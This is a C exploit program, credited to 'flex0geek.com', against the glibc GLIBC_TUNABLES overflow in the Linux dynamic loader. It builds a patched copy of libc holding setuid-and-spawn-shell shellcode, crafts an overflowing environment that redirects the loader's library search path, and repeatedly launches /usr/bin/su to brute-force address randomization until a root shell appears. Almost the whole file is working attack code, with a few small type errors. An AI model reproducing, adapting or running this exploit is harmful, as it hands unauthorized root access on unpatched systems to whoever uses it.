#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/wait.h>
#include <time.h>

#define env_name "GLIBC_TUNABLES="
#define ignore_tunable env_name "glibc.malloc.mxfast=glibc.malloc.mxfast="
#define dt_rpath "\x20\x10\x10\xfe\xff\x7f"
// #define dt_rpath "\xe0\xee\xff\xff\xff\x7f" // -> use it in NOASLR mode

char* argv[] = {"/usr/bin/su", "--help", NULL};

void replaceBytes(FILE *file, long offset, const char *replacement, size_t replacementSize) {
    fseek(file, offset, SEEK_SET);
    fwrite(replacement, sizeof(char), replacementSize, file);
}

void createLibc(){
    mkdir("\"", 0755);

    FILE *inputFile, *outputFile;
    char filename[] = "/usr/lib/x86_64-linux-gnu/libc.so.6";  // replace with your input file name
    char outputFilename[] = "\"/libc.so.6";  // replace with your output file name

    // Open the input file
    inputFile = fopen(filename, "rb");
    if (inputFile == NULL) {
        perror("Error opening input file");
        return EXIT_FAILURE;
    }

    // Create or open the output file
    outputFile = fopen(outputFilename, "wb");
    if (outputFile == NULL) {
        perror("Error opening or creating output file");
        fclose(inputFile);
        return EXIT_FAILURE;
    }

    // Replace bytes at offset 1 with the provided sequence
    long offsetToReplace = 171456; // start offset of __libc_main 
    const char replacement[] = "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05";
    size_t replacementSize = sizeof(replacement) - 1;  // -1 to exclude the null terminator

    // Copy the file content to the output file
    int ch;
    while ((ch = fgetc(inputFile)) != EOF) {
        fputc(ch, outputFile);
    }

    // Replace bytes at the specified offset
    replaceBytes(outputFile, offsetToReplace, replacement, replacementSize);

    // Close the files
    fclose(inputFile);
    fclose(outputFile);

    printf("Vulnerable libc created '%s'.\n", outputFilename);

    return EXIT_SUCCESS;
}

int64_t time_us(){
    struct timespec tms;

    /* POSIX.1-2008 way */
    if (clock_gettime(CLOCK_REALTIME, &tms))
    {
        return -1;
    }
    /* seconds, multiplied with 1 million */
    int64_t micros = tms.tv_sec * 1000000;
    /* Add full microseconds */
    micros += tms.tv_nsec / 1000;
    /* round up if necessary */
    if (tms.tv_nsec % 1000 >= 500)
    {
        ++micros;
    }
    return micros;
}

int main(){

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    puts("FlEx exploit @ flex0geek.com");
    printf("brute force 0x");
    for (int i = sizeof(dt_rpath) - 1; i >= 0; i--) {
        printf("%02x", (unsigned char)dt_rpath[i]);
    }
    printf(" as stack address\n");
    
    puts("Preparing environment");
    char** envp = calloc(0x10000, sizeof(char*));
    char** p_envp = envp;

// setup directory with patched libc
    createLibc();

// sending first tunables without overflow
    int firstTunableSize = 0x1000;
    char* firstTunableBuf = malloc(firstTunableSize+1);
    strcpy(firstTunableBuf, env_name);
    
    for(int i=sizeof(env_name)-1; i < firstTunableSize; i++){
        firstTunableBuf[i] = 'A';
    }

    *p_envp = firstTunableBuf;
    p_envp += 1;

// sending second tunable with overflow that we need
    int attackTunableSize = 0x3f0;
    char* attackTunableBuf = malloc(attackTunableSize+1+sizeof(ignore_tunable));

    strcpy(attackTunableBuf, ignore_tunable);
    for(int i=sizeof(ignore_tunable)-1; i < (attackTunableSize+sizeof(ignore_tunable)-1); i++){
        attackTunableBuf[i] = "V";
    }
    
    *p_envp = attackTunableBuf;
    p_envp += 1;

// preare the link_map struct to add the stack address(brute force) at the right offset in l_info[DT_RPATH] which is in index 15, we will use nulls before and after to not corrupt anything
    int firstNilSize = 0xdb;
    for( int i=0; i < firstNilSize; i++ ){
        *p_envp = "";
        p_envp += 1;
    }

    *p_envp = dt_rpath;
    p_envp += 1;

    int secondNilSize = 0x500;
    for( int i=0; i < secondNilSize; i++ ){
        *p_envp = "";
        p_envp += 1;
    }

// send a normal tunables to not avoid overwrite the struct from the previous attack
    int secondTunableSize = 0x40f;
    char* secondTunableBuf = malloc(secondTunableSize+1);
    strcpy(secondTunableBuf, env_name);
    
    for(int i=sizeof(env_name)-1; i < secondTunableSize; i++){
        secondTunableBuf[i] = "A";
    }

    *p_envp = secondTunableBuf;
    p_envp += 1;

// fill the stack with -20(0xffffffffffffffec) which is the sting from dynstr from su binary which point to " which will be used as trusted directory, we have to take care of aligment here
    int fillStackSize = 0x3fff;
    char* stackBuf= malloc(  (fillStackSize+1)* sizeof(char*) );

    for( int i=0; i < fillStackSize; i++ ){
        ((int64_t *)stackBuf)[i]= -20;
    }
    ((int64_t *)stackBuf)[fillStackSize] = 0x0041414141414141;

    for( int i=0; i < 0xf; i++ ){
        *p_envp = stackBuf;
        p_envp += 1;
    }

// correct the alignment
    for( int i=0; i < 0x4; i++){
        *p_envp = "";
        p_envp += 1;
    }

// brute force
    int pid;
    int count = 1;
    puts("Attack Started ");
    while( 1 ){
        count++;
        printf(".");

        if( count % 100 == 0){
            printf("\nWe tried %d times\n", count);
        }
        
        if((pid=fork()) == 0){
            // child
            execve(argv[0], argv, envp);
            // break;

        }else{
            //parent
			int wstatus;
			int st, en;
			st = time_us();
			wait(&wstatus);
			en = time_us();
			if( !WIFSIGNALED(wstatus) && en-st > 1000000 ){
				break;
			}
        }
    }

    return 0;
}